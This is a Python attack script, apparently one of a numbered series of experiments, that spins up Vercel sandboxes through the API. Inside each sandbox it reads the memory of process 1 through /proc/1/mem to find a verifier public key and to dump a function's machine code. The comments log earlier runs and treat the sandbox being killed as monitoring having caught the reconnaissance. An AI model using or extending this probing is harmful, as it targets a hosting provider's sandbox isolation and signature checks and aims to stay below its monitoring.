# 实验J207: A)确认heap里的base64公钥串 B)同沙箱扫PK32字节(Verifier.pub) C)dump wrapunary前段
# j206: "WVN8gckg"命中heap 10处! base64公钥在heap; j200找不到=沙箱key不同或区没扫全
# 本步: 1)dump命中处完整串 2)扫PK(59537c81...)定位pub存储 3)wrapunary 0x83ae00-0x83af30
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj207"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, sys
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)

# maps解析 rw区
maps = open("/proc/1/maps").read()
rws = []
for ln in maps.splitlines():
    try:
        rng, perm, off, dev, ino, *rest = ln.split()
    except ValueError:
        continue
    if "rw" in perm and ino == "0":
        lo, hi = (int(x, 16) for x in rng.split("-"))
        if hi - lo >= 0x10000:
            rws.append((lo, hi))
p("RW_REGIONS", len(rws), [(hex(a), hex(b)) for a, b in rws])

def scan(lo, hi, pat, tag, maxhits=30):
    hits = []
    off = lo
    while off < hi:
        try:
            os.lseek(fd, off, 0)
            b = os.read(fd, min(65536, hi - off))
        except OSError:
            off += 65536
            continue
        if b:
            i = b.find(pat)
            while i >= 0 and len(hits) < maxhits:
                hits.append(off + i)
                i = b.find(pat, i + 1)
        off += len(b)
    p("HITS", tag, len(hits), [hex(x) for x in hits])
    return hits

# PA: 找 base64 串 (完整44字符)
p("CP", "PA")
B64 = b"WVN8gckgVwKEruLqKSkUTl0eNyYDQzkeUh/rGeaOJUE"
b64hits = []
for lo, hi in rws:
    b64hits += scan(lo, hi, B64, "B64@" + hex(lo))
if not b64hits:
    # 退化: 找子串再dump
    for lo, hi in rws:
        b64hits += scan(lo, hi, b"WVN8gckg", "SUB@" + hex(lo))

# dump 命中处上下文 (确认完整串)
p("CP", "PB")
for h in b64hits[:8]:
    try:
        b = read_at(h - 8, 64)
        s = "".join(chr(c) if 32 <= c < 127 else "." for c in b)
        p("B64CTX", hex(h), repr(s))
    except Exception as e:
        p("ERR", hex(h), repr(e))

# PC: 扫 PK 32字节 (同一沙箱!)
p("CP", "PC")
PK = bytes.fromhex("59537c81c920570284aee2ea2929144e5d1e37260343391e521feb19e68e2541")
pkhits = []
for lo, hi in rws:
    pkhits += scan(lo, hi, PK, "PK@" + hex(lo))
for h in pkhits[:8]:
    try:
        b = read_at(h - 0x20, 0x80)
        p("PKCTX", hex(h), b.hex())
    except Exception as e:
        p("ERR", hex(h), repr(e))

# PD: dump wrapunary 前段机器码 (本地反汇编 msg构建)
p("CP", "PD")
b = read_at(0x83ae00, 0x140)
p("WU_HEX", b.hex())
p("done")
'''

st = run_cmd(sid, CODE, "J207", timeout=290)
time.sleep(2)
if st == "DEAD":
    print("\n!!! DEATH -> 侦察触发监控", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
